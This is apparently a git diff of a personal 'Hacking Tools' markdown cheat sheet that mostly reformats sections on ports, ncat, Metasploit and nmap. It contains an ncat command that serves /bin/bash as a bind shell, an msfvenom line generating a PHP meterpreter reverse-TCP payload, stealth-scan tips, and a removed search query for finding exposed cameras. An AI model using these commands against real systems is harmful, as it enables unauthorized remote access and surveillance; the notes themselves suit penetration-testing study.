@@ -1,5 +1,5 @@
 # Hacking Tools
-
+---
 ******************** Ports information **************************
 There are 65535 port numbers (2^16).
 
@@ -47,26 +47,42 @@ dig +short -x <IP adress>
 ```
 
 
+## NCAT
+
+Tool for reading and writing data across the network.
+
+Use ncat as a server running in port 8080:
+
+```Shell
+ncat -l <ip> <port>
+```
+
+Example:
+
+```Shell
+ncat -l 127.0.0.1 8080
+```
+
+Establish a connection with the server:
+
+```Shell
+ncat 127.0.0.1 8080
+```
 
 
 
 
-inurl:"ViewerFrame?Mode=" (useful for finding cameras)
 
 
---------NCAT (Tool for reading and writing data across the network)----------------
 
-ncat -l 127.0.0.1 8080 (Use ncat as a server running in port 8080)
-ncat 127.0.0.1 8080 (Establish a connection with the server)
 
-// It behaves like a real time chat
 
 ncat -l --exec "/bin/bash" 127.0.0.1 8080 (For execute the given command)
 
 
 ------------------------ARMITAGE (Graphical user interface for Metasploit)------------------------
 
-----------------------------------------METASPLOIT------------------------------------------------
+## Metasploit
 
 *(S): For shell commands
 
@@ -106,7 +122,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=<Our ip address> LPORT=4444 -e php
 
 
 
-----------------------------------------NMAP-------------------------------------------------------
+## NMAP
 
 // Use -sS for a stealth scan, -sT flag is louder. Use -sV for showing services version
 
